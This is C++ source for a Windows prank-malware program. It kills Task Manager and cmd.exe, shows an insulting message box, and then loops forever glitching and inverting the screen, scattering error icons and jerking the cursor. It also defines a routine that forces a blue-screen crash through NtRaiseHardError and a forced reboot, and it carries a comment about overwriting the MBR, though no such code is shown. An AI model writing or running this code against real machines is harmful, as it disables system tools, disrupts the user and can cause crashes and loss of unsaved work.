#include <iostream>
#include <windows.h>
#include <ctime>
#include <cstdlib>
#include <wingdi.h>
 
void bsod() {
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");
    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1; DWORD tmp2;
        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
    }
    HANDLE token;
    TOKEN_PRIVILEGES privileges;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}
 
void GetDesktopResolution(int& horizontal, int& vertical)
{
    RECT desktop;
    const HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);
    horizontal = desktop.right;
    vertical = desktop.bottom;
}
 
void drawErrors() {
    int ix = GetSystemMetrics(SM_CXICON) / 2;
    int iy = GetSystemMetrics(SM_CYICON) / 2;
 
    POINT cursor;
    GetCursorPos(&cursor);
    HDC hdc = ::GetDC(0);
    DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
    DrawIcon(hdc, rand() % (cursor.y - ix), rand() % (cursor.x - iy), LoadIcon(NULL, IDI_ASTERISK));
    DrawIcon(hdc, rand() % (cursor.y - ix), rand() % (cursor.x - iy), LoadIcon(NULL, IDI_WARNING));
    DrawIcon(hdc, rand() % (cursor.y - ix), rand() % (cursor.x - iy), LoadIcon(NULL, IDI_INFORMATION));
    DrawIcon(hdc, rand() % (cursor.y - ix), rand() % (cursor.x - iy), LoadIcon(NULL, IDI_HAND));
}
 
void glitchScreen() {
    HDC screenDC = ::GetDC(0);
    int h = 0;
    int v = 0;
    GetDesktopResolution(h, v);
 
    BitBlt(screenDC, rand() % 1500, rand() % 100, 1920, 1920, screenDC, rand() % 99, rand() % 1700, NOTSRCCOPY);
    StretchBlt(screenDC, 50, 50, h - 100, v - 75, screenDC, 0, 0, h, v, SRCCOPY);
    BitBlt(screenDC, rand() % 1500, rand() % 100, h, v, screenDC, rand() % 99, rand() % 1700, NOTSRCCOPY);
}
 
 
int main()
{
    // system("taskkill /im \"explorer.exe\" /f"); // Currently disabled
    system("taskkill /im \"taskmgr.exe\" /f");
    system("taskkill /im \"cmd.exe\" /f");
    system("cls");
    // MBR Overwrite
    MessageBox(NULL, L"jaja puto eddy", L"HALERTATEST", MB_OK | MB_ICONEXCLAMATION);
    while (true) {
        int i = 0;
        Sleep(50);
        POINT p;
        GetCursorPos(&p);
        srand(time(0) + rand() % 9999 + (-1000));
        glitchScreen();
        drawErrors();
        SetCursorPos(p.x + (rand() % 19 + (-9)) * 5, p.y + (rand() % 19 + (-9)) * 20);
 
        if(GetAsyncKeyState(VK_RSHIFT)) {
            exit(1);
        }
    }
}
